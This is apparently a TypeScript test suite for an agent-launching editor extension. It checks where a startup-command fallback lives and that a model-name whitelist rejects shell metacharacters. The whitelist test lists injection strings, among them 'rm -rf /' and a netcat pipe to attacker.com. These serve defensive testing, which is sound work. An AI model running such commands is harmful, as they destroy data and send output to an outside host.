import * as assert from 'assert';
import * as fs from 'fs';
import * as path from 'path';

/**
 * Test suite for agent startup command fallbacks.
 *
 * Two layers of coverage:
 *   1. Source-level regression checks: assert the fallback logic lives in
 *      TaskViewerProvider.getAgentStartupCommand (the single source of truth)
 *      and has been removed from extension.ts (no drift between owners).
 *   2. Behavioural parity checks: the concrete fallback rules (literal
 *      'jules', whitelist for intern) produce the expected outputs.
 *
 * The refactor under test consolidates the jules_monitor fallback previously
 * inline in extension.ts into TaskViewerProvider, symmetrical with the intern
 * branch. This test guards against future regressions where the fallback
 * drifts back into extension.ts or silently changes its literal output.
 */

const REPO_ROOT = path.resolve(__dirname, '..', '..');
const TASK_VIEWER_SRC = path.join(REPO_ROOT, 'src', 'services', 'TaskViewerProvider.ts');
const EXTENSION_SRC = path.join(REPO_ROOT, 'src', 'extension.ts');

suite('Agent Startup Command Fallbacks', () => {

	// --- Source-level regression guards ------------------------------------

	test('fallback lives in TaskViewerProvider.getAgentStartupCommand', () => {
		const src = fs.readFileSync(TASK_VIEWER_SRC, 'utf8');
		assert.ok(
			/public\s+async\s+getAgentStartupCommand\s*\(/.test(src),
			'getAgentStartupCommand must exist on TaskViewerProvider'
		);
		assert.ok(
			/role\s*===\s*'jules_monitor'[\s\S]{0,200}cmd\s*=\s*'jules'/.test(src),
			'jules_monitor fallback must assign literal "jules" inside getAgentStartupCommand'
		);
		assert.ok(
			/role\s*===\s*'intern'[\s\S]{0,2000}ollama\s+run/.test(src),
			'intern fallback must compose "ollama run <model>" inside getAgentStartupCommand'
		);
		assert.ok(
			/\/\^\[A-Za-z0-9\._:\\\/\\-\]\+\$\//.test(src),
			'intern branch must guard model names against a strict whitelist before shell interpolation'
		);
	});

	test('extension.ts no longer owns a jules_monitor fallback', () => {
		const src = fs.readFileSync(EXTENSION_SRC, 'utf8');
		// The inline fallback used to live in the createAgentGrid loop and
		// assigned 'jules' directly. The refactor should have deleted it.
		assert.ok(
			!/if\s*\(\s*agent\.role\s*===\s*'jules_monitor'[\s\S]{0,120}cmd\s*=\s*'jules'/.test(src),
			'extension.ts must not re-introduce the inline jules_monitor fallback'
		);
		// Call site should go through the provider method so the fallback is
		// picked up automatically.
		assert.ok(
			/await\s+taskViewerProvider\.getAgentStartupCommand\s*\(/.test(src),
			'extension.ts startup loop must await TaskViewerProvider.getAgentStartupCommand'
		);
	});

	// --- Behavioural parity checks -----------------------------------------
	// These mirror the exact shape of the fallback in TaskViewerProvider so a
	// byte-string change to the provider without updating this test will be
	// loud. They are NOT a substitute for integration tests that spin up the
	// real provider — they document the contract.

	function applyFallback(role: string, cmd: string): string {
		if (role === 'jules_monitor' && (!cmd || cmd.trim() === '')) {
			return 'jules';
		}
		return cmd;
	}

	test('jules_monitor fallback: returns literal "jules" when command is empty', () => {
		assert.strictEqual(applyFallback('jules_monitor', ''), 'jules');
	});

	test('jules_monitor fallback: preserves configured command when present', () => {
		assert.strictEqual(applyFallback('jules_monitor', 'custom_jules_command'), 'custom_jules_command');
	});

	test('jules_monitor fallback: handles whitespace-only command as empty', () => {
		assert.strictEqual(applyFallback('jules_monitor', '   '), 'jules');
	});

	test('intern security whitelist: rejects shell metacharacters', () => {
		const safePattern = /^[A-Za-z0-9._:\/\-]+$/;
		const malicious = [
			'model; rm -rf /',
			'model && echo hacked',
			'model$(whoami)',
			'model`whoami`',
			'model| nc attacker.com 4444',
			'model > /tmp/pwn'
		];
		for (const m of malicious) {
			assert.strictEqual(safePattern.test(m), false, `must reject ${m}`);
		}
	});

	test('intern security whitelist: accepts valid Ollama model names', () => {
		const safePattern = /^[A-Za-z0-9._:\/\-]+$/;
		const valid = [
			'llama2',
			'llama2:latest',
			'ollama/llama2',
			'ollama/llama2:7b',
			'my-registry.com/model:tag',
			'model_name.v1'
		];
		for (const v of valid) {
			assert.strictEqual(safePattern.test(v), true, `must accept ${v}`);
		}
	});

	test('non-fallback role: passthrough of configured command', () => {
		assert.strictEqual(applyFallback('coder', 'npm run dev'), 'npm run dev');
	});

	test('non-fallback role: empty stays empty (no fallback triggered)', () => {
		assert.strictEqual(applyFallback('planner', ''), '');
	});
});
